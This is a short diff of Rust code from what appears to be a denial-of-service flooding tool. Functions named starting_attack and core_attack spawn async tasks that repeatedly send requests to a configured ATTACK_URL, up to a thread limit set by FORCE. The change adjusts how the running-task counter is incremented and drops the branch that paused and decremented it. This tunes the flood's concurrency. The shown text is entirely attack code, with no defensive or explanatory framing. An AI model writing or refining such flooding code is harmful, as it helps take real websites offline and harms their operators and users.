@@ -28,8 +28,8 @@ unsafe fn starting_attack() {
 }
 
 unsafe fn core_attack() {
-    ON_THREADS = ON_THREADS + 1;
     if ON_THREADS < crate::FORCE {
+        ON_THREADS = ON_THREADS + 1;
         tokio::spawn(async {
             let error_data = request(&crate::ATTACK_URL).await;
             match error_data {
@@ -49,9 +49,6 @@ unsafe fn core_attack() {
                 }
             }
         });
-    } else {
-        thread::sleep(time::Duration::from_millis(2));
-        ON_THREADS = ON_THREADS - 1;
     }
 }
 
